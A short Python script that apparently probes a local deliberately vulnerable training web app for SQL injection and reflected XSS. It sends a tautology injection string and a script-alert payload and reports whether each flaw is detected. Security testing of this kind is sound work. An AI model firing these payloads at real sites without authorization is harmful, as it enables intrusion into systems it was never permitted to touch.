import requests

# Update this with your actual session cookie from browser
cookies = {
    'PHPSESSID': 'rp0bupd8469q3l9vpm1sgja341',
    'security': 'low'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Base URL
base_url = 'http://localhost:8080/vulnerabilities/'

# ✅ SQL Injection Test
def test_sqli():
    payload = {
        'id': "1' OR '1'='1",
        'Submit': 'Submit'
    }
    response = requests.get(base_url + 'sqli/', params=payload, cookies=cookies)
    if "First name" in response.text and "Surname" in response.text:
        print("✅ SQL Injection vulnerability detected!\n")
    else:
        print("❌ No SQL Injection vulnerability detected.\n")

# ✅ XSS Test
def test_xss():
    payload = {
        'name': "<script>alert('XSS')</script>",
        'Submit': 'Submit'
    }
    response = requests.get(base_url + 'xss_r/', params=payload, cookies=cookies)
    if "<script>alert('XSS')</script>" in response.text:
        print("✅ XSS vulnerability detected!\n")
    else:
        print("❌ No XSS vulnerability detected.\n")

# Run tests
print("🔐 Starting Security Tests...\n")
test_sqli()
test_xss()
